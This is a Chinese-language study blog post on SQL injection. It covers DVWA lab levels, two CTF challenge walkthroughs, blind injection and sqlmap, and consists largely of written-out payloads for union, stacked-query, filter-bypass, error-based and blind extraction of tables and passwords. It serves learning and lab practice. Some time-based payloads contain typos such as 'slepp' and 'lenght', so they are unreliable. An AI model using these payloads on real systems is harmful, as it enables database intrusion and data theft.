---
title: sql注入学习
date: 2022-07-06 18:12:19
tags: web安全
---

# SQL注入(DVWA)



## 1.Low (可以手工注入)

手工注入并且不是盲注(盲注就是在sql注入过程中，sql语句执行的选择后，选择的数据不能回显到前端页面。)

### MYSQL结构

一个数据库可以创建多个表，一张表含有多列。比如我有一个'客户'的数据库，这个数据库需要'用户信息'，‘用户消费记录’，‘用户反馈’等表，对于'用户信息'这张表来说，又需要'电话号码'，’年龄‘，’姓名‘等信息，这些信息单位作为每列的表头。

### 注入流程

- 是否存在注入并且判断注入类型
- 判断字段数：  order by
- 确定回显位：union select 1,2(查询的信息在前端有回显，回显数据的位置就叫回显位。)
- 查询数据库信息：
- 查询用户名，数据库名：user() database()
- 文件读取
- 写入webshell

### 闭合方式

```
 where user_id = 1 or 1=1   //无引号闭合
 where user_id = '1' or '1'='1' //单引号闭合
 where user_id =" 1 "or "1"="1" //双引号闭合
```



### 注入类型

- UNION query SQL injection（可联合查询注入)
- Stacked queries SQL injection（可多语句查询注入）堆叠查询
- Boolean-based blind SQL injection（布尔型注入）
- Error-based SQL injection（报错型注入）
- Time-based blind SQL injection（基于时间延迟注入）
- 字符型注入
- 数字型注入

#### 1.可联合查询注入

- 条件：如果使用union查询，要先猜字段数量，因为通过union连接的两条SQL语句必须字段数列一样。最后面加上order by 2 得出到底有多少行（就是一直减少到前端出来东西为止）

  ```sql
  xxx union select 1,2,3,4,6,7,8
  #这里也要看看有多少select出来的可以在前端看到，一直减少select后面的数字知道前端刷新出东西，也就是确定回显位
  #然后可以把回显位的地方替换成user()、database()、version()等查询查询命令在前端得到对应信息
  ```

- 步骤：判断完回显点之后

  - 查数据库名：

    ```sql
    1' union select 1,database()#
    1' union select user(),database()#
    ```

  - 查表名 

    ```
    xxx union select 1,2,3,4,TABLE_NAME,6,7,8 from information_schema.TABLES where TABLE_SCHEMA='数据库名' limit 1,1
    ```

    **information_schema.TABLES** 是MySQL自带的，它提供了访问数据库元数据的方式。什么是元数据呢?元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。
    因为前端显示的限制，所以要**limit**，**limit 1,1则代表从第一条起，只显示一条**

    但也可以利用函数将查询结果凭借**concat()、group_concat**函数来，这两个函数我们可以简单认为是连接字符串，比如group_concat(user(),database(),version())就是把这三个常量的注入结果连接在一起，当做一个整体字符串显示在注入结果中

    ```
    1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#
    ```

  - 查列名

    利用**information_schema.columns**查列名，后面的**table_name**跟上一步查出的表名

    ```
    1' union select 1,group_concat(column_name) from information_schema.columns where table_name ='users'#
    ```

  - 查用户数据

    利用上一步的到的列名进一步查询用户信息

    ```
    1' or 1=1 union select group_concat(列名1，列名2，列名3),group_concat(password) from 表名 #
    1' or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #
    1' union select null,group_concat(concat_ws(char(32,58,32),user,password)) from users #  
    ```

  - 最后的到数据可能会被编码，比如 MD5,SM6等，注意解码。

    

    

  #### 2.堆叠查询

  - 原理：数据库中';'表示一个语句的结束，如果没有对';'过滤，可以同时构造多条不同的语句，区别于联合查询注入的是联合查询只能执行查询语句，而堆叠查询可以执行任意语句，每条语句用';'隔开即可。

  - 步骤

    - 查数据库名

      ```
      1'; show databases;#
      ```

    - 查表名

      ```
      1'; show tables from '数据库名';#  
      ```

    - 查列名

      ```
      1'; show columns from `表名`;#
      注意如果是以纯数字作为表名或列名，要用~下面`引起来
      ```

    - 查完列名后查看相关信息，有些题目可能会用正则匹配阻止注入，比如

      ```
       preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
      ```

      这时候想要直接查询是很难的。于是可以考虑使用**预编译绕过**或者用**handler**语句绕过

      - 预编译：预编译语句就是将这类语句中的**值用占位符替代**，可以视为将**sql语句模板化或者说参数化**。一次编译、多次运行，省去了解析优化等过程。

      - 基本操作

        ```
        1';set @自定义变量=concat('s','elect * from '列名'');prepare 自定义模板名 from @自定义变量名;execute 自定义模板名;#
        ```

      - handler：mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。**它是mysql专用的语句**，并没有包含到SQL标准中。

      - 基本语法

        ```
        HANDLER tbl_name OPEN;
        HANDLER tbl_name READ index_name;
        因此可以尝试专业这样绕过select:
        1';handler tab_name open;handler tab_name read first/second/..;#
        ```

      - 还有可能继续阻止注入，比如

        ```sql
        strstr($inject, "set") && strstr($inject, "prepare")
        ```

    - 遇到当前输入框所查询的表不是目标表的时候，还存在正则匹配阻止注入，可以尝试改变表名来查询

      ```sql
      rename table `old_name` to new_name;
      ```

### 3.关键词被过滤的替代方法

- 双写绕过

  双写绕过的原理是后台利用正则匹配到敏感词将其替换为空。即如果过滤了``select``，我们输入``123select456`` 后会被检测出敏感词，最后替换得到的字符串由``123select456`` ---> ``123456``

  ```
  1' ununionion seselectlect 1#
  ```

- 大小写绕过

- 空格过滤

  如果遇到空格被过滤了，主要的几个思路都是想办法找一个代替品，能代替空格的有几个：

  ```
  注释绕过  /**/ :正常情况下只要这个没有被过滤就一定能代替。
  括号过滤 () ：将所有的关键字都用括号括起来就可以达到替代空格分隔的作用如下，
  正常：select * from user
  括号：(select)*(from)(user)
  url编码：这种遇到可以试试。用%20代替空格或者用其他的url编码
  回车换行替代：回车换行也可以用做分隔功能替代空格。
  Tab替代：Tab可以做分隔功能。
  ```

- 注释过滤

  ```
  #、;%00、-- (两个减号一个空格)
  ```

### 4.报错注入

- XPath报错注入

  - XPath使用路径表达式来选取 XML 文档中的节点或节点集。节点是通过沿着路径 (path) 或者步 (steps) 来选取的。

  - 常用的路径表达式

    ```xml
    nodename(一个结点的名字)：选取此节点的所有子节点
    /                      ：从根节点选取
    //                     ：从匹配选择的当前节点选择文档中的节点，而不考虑位置
    .                      ：选取当前节点
    ..                     ：选取当前节点的父节点
    @                      ：选取属性
    *                      ：可以匹配任何元素
    ```

  - 具体应用

    ```xml
    <?xml version="1.0" encoding="ISO-8859-1"?>
    <root>
        <son>
            <name lang="s1">s1</name>
            <weight>1</weight>
            <son></son>
        </son>
        <son>
            <name lang="s2">s2</name>
            <weight>2</weight>
            <son></son>
        </son?>
    </root>
    
    
    ```

    具体语法表示

    ```xaml
    root            ：选取root元素的所有子节点，即两个son元素
    /root           ：选取根元素root
    root/son        ：选取属于root的子元素的所有son元素，root下面的son，son下面的son不算
    //son           ：选取所有son子元素，不管它们在文档中的位置，root下的son和son里面的son
    root//son       ：选取root元素的后代的所有son元素，不管它们在文档中的什么位置，son里面的son也算
    //@lang         ：选取名为lang的所有属性
    ```

  - 在Sql报错注入中的应用

    - `extractvalue('目标xml文件名','在xml中查询的字符串')`：对XML文档进行查询的函数

      第二个参数要求的是Xpath格式的字符串，语法正确是会按照路径 `/该xml文件/要查询的字符串` 进行查询 ，如果我们输入的`Xpath_string`不对就会报错，一般这个参数会填入我们想知道的数据库的信息，通过报错来获得，一般数据会在url中回显

    - `updatexml('目标xml文件名','在xml中查询的字符串','替换后的值')`

      第一、三个参数随便填，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式函数利用，否则报错，利用和上面的一样 

    - 两处利用的参数形式

      一般是`concat(0x7e,sql命令,0x7e)`来填充，选用`0x7e`是`~`符号，是为了让xml的全部数据都校验失效，还可以用`'#'`或`0x4e24`

      

### 5.例题

#### 1.[强网杯 2019]随便注

- 首先尝试判断回显

  ```
  1' union select 1,2
  ```

  但是出现了这样的错误信息

  ```
  return preg_match("/select|update|delete|drop|insert|where|\./i",$inject);
  ```

  说明通过了正则匹配来防止注入，`select`和`where`不能用了，所以考虑堆叠注入

- 先看一下能不能用万能密码和闭合方式

  ```
  1' or 1=1 #
  ```

  返回了类似数据库的内容

- 查看表名

  ```
  1';show tables#
  ```

  返回的数据如下

  ```php
  array(2) {
    [0]=>
    string(1) "1"
    [1]=>
    string(7) "hahahah"
  }
  -----------------------------------------------------------------------------------------------
  array(1) {
    [0]=>
    string(16) "1919810931114514"
  }
  
  array(1) {
    [0]=>
    string(5) "words"
  }
  
  ```

  说明有两个表，分别是`words`和`1919810931114514`

- 分别查看这两个表的列

  ```sq
  1';
  show columns from `words`;
  show columns from `1919810931114514`;#
  ```

  返回数据如下

  ```php
  array(6) {
    [0]=>
    string(2) "id"
    [1]=>
    string(7) "int(10)"
    [2]=>
    string(2) "NO"
    [3]=>
    string(0) ""
    [4]=>
    NULL
    [5]=>
    string(0) ""
  }
  
  array(6) {
    [0]=>
    string(4) "data"
    [1]=>
    string(11) "varchar(20)"
    [2]=>
    string(2) "NO"
    [3]=>
    string(0) ""
    [4]=>
    NULL
    [5]=>
    string(0) ""
  }
  -----------------------------------------------------------------------------------------------
  array(6) {
    [0]=>
    string(4) "flag"
    [1]=>
    string(12) "varchar(100)"
    [2]=>
    string(2) "NO"
    [3]=>
    string(0) ""
    [4]=>
    NULL
    [5]=>
    string(0) ""
  }
  
  ```

  发现`words`有`id`和`data`列，而`1919810931114514`有`flag`列。显然答案就是`flag`里面的内容，但问题是`select`被正则匹配阻止了注入，所以不能通过这样的方式来查询`flag`的内容。但可以发现，输入框的内容是输出`words`表的内容，所以考虑吧`1919810931114514`的表名改为`words`，然后通过万能密码来获得`flag`

- 修改表名

  ```
  1';
  rename table `words` to words2;
  rename table `1919810931114514` to words;
  alter table words change flag id varchar(100);
  show tables; 
  show columns from words;# 
  ```

- 获得答案

  ```
  1' or 1=1 #
  ```

#### 2.[极客大挑战 2019]HardSQL1

这道题发现万能密码、联合注入、堆叠注入、双写绕过都行不通。但可以使用报错注入，但还会过滤空格和and，所以用`^`或`|`来连接

- 首先查看数据库名

  ```
  1'^extractvalue(1,concat(0x7e,(database())))#
  ```

  得到

  ```
  XPATH syntax error: '~geek'
  ```

- 查看数据库表名

  ```
  1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#
  ```

  `information_schema`：可以看做是一个全局数据库，记录了所有的数据库名、表名、列名等

  `table_schema`：数据表所属的数据库名

  `like`：like操作符用于在where子句中搜索列中的指定模式。

  结果得到

  ```
  XPATH syntax error: '~H4rDsq1'
  ```

- 查看数据库列名

  ```
  1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#
  ```

  `table_name`：数据表名

  得到的结果

  ```
  XPATH syntax error: '~id,username,password'
  ```

- 猜测flag在`password`字段中

  ```
  1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#
  ```

  得到

  ```
  XPATH syntax error: '~flag{4c02c593-6680-4a0c-bbca-82'
  ```

  由于输出有长度限制，所以强制选取右边的几位

  ```
  1'^extractvalue(1,concat(0x7e,(select(right(password,30))from(H4rDsq1))))#
  ```

  得到

  ```
  XPATH syntax error: '~3-6680-4a0c-bbca-82b9c809b60e}'
  ```

  

## 2.Medium(无法手工注入，没有输入框这类)

相比于Low，Medium的防护措施是加入了**mysql_real_escape_string()**函数，该函数对**\x00,\n,\r,',",\x1a**进行转义，同时前端页面设置了下拉框，希望来控制用户输入。

思路：用**Burpsuite**等工具截取http报文后修改参数，步骤和Low完全一样。

## 3.盲注

- 现象：没有报错回显，只是显示是否正确

- 常见的应对手法：布尔盲注、时间盲注、报错盲注

- 一般过程

  - 判断是否存在注入，注入是字符型还是数字型
  - 猜测当前数据库名$\rightarrow$猜测数据库长度$\rightarrow$猜测数据库名称
  - 猜测数据库表名$\rightarrow$猜测表的数量$\rightarrow$猜测表的长度$\rightarrow$猜测表的名称
  - 猜测表的字段名$\rightarrow$猜测列的数量$\rightarrow$猜测列的长度$\rightarrow$猜测列的名称

- 经常使用的函数

  ```
  length() 函数返回字符串的长度 
  substr() 截取字符串 （语法:SUBSTR(str,pos,len);）  
  ascii() 返回字符的ascii码 [将字符变为数字]
  sleep() 将程序挂起一段时间n秒 
  if(expr1,expr2,expr3) 判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句
  ```

  

### 1.布尔盲注

##### DVWA盲注实验

- 判断注入类型

  ```
  1 or 1=1 
  =>User ID exists in the database.
  ```

  再尝试

  ```
  1 or 1=2
  =>User ID exists in the database.
  ```

  因此是字符型注入，sql语句应该是

  ```sql
  select * from table_name where 'input'
  ```

  

- 判断数据库名长度

  ```
  1' and length(database())=len#
  ```

  这里去len=1,2,3都是返回`User ID is MISSING from the database.`

  当取len=4的时候返回`User ID exists in the database.`所以判断数据库长度为4

- 猜测数据库的名称

  逐个判断数据名的每一个字符，用对应的ASCALL码来判断相等，这里常用二分法来判断。注意这里截取字符串开始下标是从1开始的

  ```
  1' and ascii(substr(database(),1,1))>90  #
  =>User ID exists in the database.
  
  1' and ascii(substr(database(),1,1))>100 #
  =>User ID is MISSING from the database.    说明第一个字符的ascall在91-100之间
  
  1' and ascii(substr(database(),1,1))>95 #
  =>User ID exists in the database.    在96-100之间
  
  1' and ascii(substr(database(),1,1))>98 #
  =>User ID exists in the database.    在99-100之间
  
  1' and ascii(substr(database(),1,1))=99 #
  =>User ID is MISSING from the database.
  
  1' and ascii(substr(database(),1,1))=100 #
  =>User ID exists in the database.    确定是100
  ```

  重复利用以上方法，可以得到数据名为`dvwa`。还可以通过burpsuite爆破或者数据库来源猜测

- 猜测表的数量

  table_name  表名称

  table_schema 数据表所属的数据库名

  ```
  1' and (select count(table_name) from information_schema.tables where table_schema='dvwa')=2 #
  =>User ID exists in the database. 所以表的数量是2
  ```

- 猜测表的长度

  `limit i,j`和`select`共同使用：用于接收select查询的结果从第$i$行开始检索$j$行。一般$i$是第几张表，下标从$0$开始

  ```
  1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1))=9#
  =>User ID exists in the database. 说明第一个表的长度是9
  
  1' and length(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),1))=5#
  =>User ID exists in the database.  说明第二个表的长度是5
  ```

- 爆破表名

  和爆破数据库名的方法一样

  ```
  1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 0,1),1,1))=103 #
  =>User ID exists in the database. 第一张表的第一个字符是g
  
  ...
  
  1' and ascii(substr((select table_name from information_schema.tables where table_schema='dvwa' limit 1,1),5,1))=ascall(r) #
  ```

  最终可以得到第一张表名是`guestbook`，第二张表是`user`

- 猜测列的数量，以下只猜测`user`表的列

  ```
  1' and (select count(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users')=8 #
  => User ID exists in the database. 列数量为8
  ```

- 猜测列长度

  ```
  1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1) )=7#
  ...
  1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 7,1 ),1) )=12#
  ```

  依次爆破得到每一个列的长度

- 猜测列名

  ```
  1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 0,1 ),1,1) )=ascall_num#
  ...
  1' and length(substr( ( select column_name from information_schema.columns where table_schema='dvwa' and table_name='users' limit 7,1 ),12,1) )=ascall_num#
  ```

  最后可以得到比较重要的两个列`user`和`password`

- 猜测字段长度

  ```
  1' and length(substr((select user from users limit 0,1),1))=5 #
  ```

  `user`列的第一个字段长度为$5$，然后依次的得到第二、三个字段的长度

- 猜测字段名称

  ```
  1' and ascii(substr((select user from users limit 0,1),1,1))=97 #a
  ```

  依次爆破，得到第一个字段是`admin`。同理爆破`password`得到密码，但dvwa这里的密码用md5加密了，所以会有点长，这里同样可以爆破或者根据题目背景猜测弱密码等，得到密码为`md5(password)=5f4dcc3b5aa765d61d8327deb882cf99`

  验证爆破答案

  ```
  1' and (select count(*) from users where user='admin'  and password='5f4dcc3b5aa765d61d8327deb882cf9')=1 #
  ```

- 每个都可以用`BurpSuite`的`intruder`功能爆破

- 还可以用`sqlmap`

  ```
  -u 指定注入点
  --dbs 跑库名
  --tables 跑表名
  --columns 跑字段名
  --dump 枚举数据
  ```

  

### 2.时间盲注

布尔盲注是通过页面返回正误来判断，而在没有回显正误的条件下，可以考虑是否可以进行时间盲注，一般通过`if`语句连接判断条件和`sleep`函数，如果判断条件成立，页面会有延时，否则就没有延时

- 判断是否可以使用时间盲注

  ```
  1' and slepp(5) #
  ```

- 判断数据库长度

  ```
  1' and if((lenght(database()))=len, slepp(5) ,1) #
  ```

- 猜测数据库名

  ```
  1' and if((ascii(substr(database(),1,1)))=ascall_num,sleep(5),1) #
  ```

- 方法布尔盲注差不多，只不过是判断条件不同而已

#### 3.报错盲注

## 4.sqlmap的使用

- 支持的数据库类型：

  ```
  MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB
  ```

- 常用命令

  ``` shell
  sqlmap -u url/ip
  sqlmap -u ip --forms  #POST注入，读取页面中POST传参的表单的传参名然后进行SQL注入
  sqlmap -u ip --forms --dbs #跑库名
  -D 指定库 -T 指定表 -C 指定字段
  sqlmap -u ip --forms -D post_error --tables #跑表名
  sqlmap -u ip --forms -D post_errow -T flag --colnums #字段名
  sqlmap -u ip --forms -D post_errow -T flag -C flag --dump #出数据
  ```

  [更具体的使用链接](https://www.cnblogs.com/hongfei/p/3872156.html)



参考链接

[SQL注入之盲注](https://www.freebuf.com/articles/web/281559.html)

[dvwa模拟实验2——sql盲注](https://blog.csdn.net/Allen__0/article/details/103975792)

